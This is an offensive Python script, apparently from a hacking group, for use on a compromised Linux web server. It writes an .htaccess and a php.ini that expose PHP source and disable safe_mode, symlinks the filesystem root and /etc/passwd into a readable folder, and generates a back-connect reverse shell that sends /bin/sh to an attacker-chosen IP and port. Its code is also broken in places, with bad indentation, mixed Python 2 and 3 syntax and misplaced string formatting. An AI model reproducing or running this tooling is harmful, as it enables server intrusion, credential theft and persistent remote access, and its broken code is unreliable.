#!/usr/bin/python3
import sys, socket, os, subprocess

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
    SysCls = 'clear'
    symlink = 'ln -s / 1.txt'
    pwd  = ('pwd')
    create = ('mkdir sym')
    cd = ('cd sym')
    passwd = ('ln -s /etc/passwd passwd.txt')

print "\n|---------------------------------------------|"
print "| ##~ Mid Set LoC ReAd                          |"
print "|   2015     midset.py                          |"
print "|    - Linux server read files                  |"
print "| Read /etc/passwd >> passwd.txt                |"
print "| GreeTz : HsN,Hiso,marco,vir,oudouz,ked,D3v    |"
print "|          All Rights Reserved @ Mid-Set        |"
print "| C0ntact : http://fb.com/midset00              |"
print "|----------------------------------------------|\n"
print "|----------------------------------------------|\n"
    def sym():
        htacess = open ('.htaccess' , 'w')
        inputx = 'Options Indexes FollowSymLinks \nDirectoryIndex ssssss.htm \nAddType txt .php \nAddHandler txt .php'
        htacess.write(inputx)            
        phpini = open ('php.ini', 'w')
        input2 = ('safe_mode      = off disabled_functions     = none')
        phpini.write(input2)
        os.system(SysCls)
        os.system(cd)
        os.system(symlink)
        os.system(passwd)
        os.system(pwd)
    def BackConnect():
        back = open ('back.py' , 'w')
        inback = '''ip = sys.argv[1]    \n port2 = int(sys.argv[2])   \nsocket.setdefaulttimeout(60)  \ndef outside():  \ntry: \nsok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  \nsok.connect((ip,port2))   \nsok.send('roote.dz@gmail.com@gmail.com    \nmidset007.net \n')     \nos.dup2(sok.fileno(),0) \nos.dup2(sok.fileno(),1)   \nos.dup2(sok.fileno(),2)   \nos.dup2(sok.fileno(),3)    \nshell = subprocess.call(["/bin/sh","-i"])  \nexcept socket.timeout:   \nprint ("[!] Connection timed out")   \nexcept socket.error:  \nprint ("[!] Error while connecting")  \noutside() '''
        back.write(inback)
        os.system('chmod 755 back.py')
    print(''' 
    Welcome to my script :) :)
    please choose one of these options :
    0 - quit program
    1- BackConnect (create a back connect file)
    2- create Symlink to whole server
    3- create Symlink to a file

    PS : * if you used choices 2 or 3 we will bypass safe_mode in server
         * a passwd.txt file will created cointain /etc/passwd file
         * you will find files in "sym"

    if you are using this Script from the web, you can BackConnect by typing
    python SymConnect.py [ip] [port]
    example: python SymConnect 192.168.0.0 77


    ''')
    
    

    ann = raw_input("Mid-Set >>> ")
    all = 0

    if ann == '1' :
		BackConnect()
        ip = input ('enter you ip address')
        port = input ('enter the port to listennning')
        os.system('python back.py %s %s') % (ip, port)
        print('# Connecting...')

    elif ann == '2':
		sym()
        print('the server symlink created successfully in 1.txt ')
        print('--------------------------------------------------')
        
    elif ann == '3':
        directory = input ('Enter the file you would create symlink for>>>')
        print('~~~~~~~~~~~~~~~~')
        where = input ('select a name for the file containt your dirocroty sym >>> ')      
        os.system('ln -s %s %s') % (where, directory )
        print('your symlin in %s ') % (where)
        os.system(pwd)
        sym()
    
else:
	print('Does not support this system, Only Linux :D')


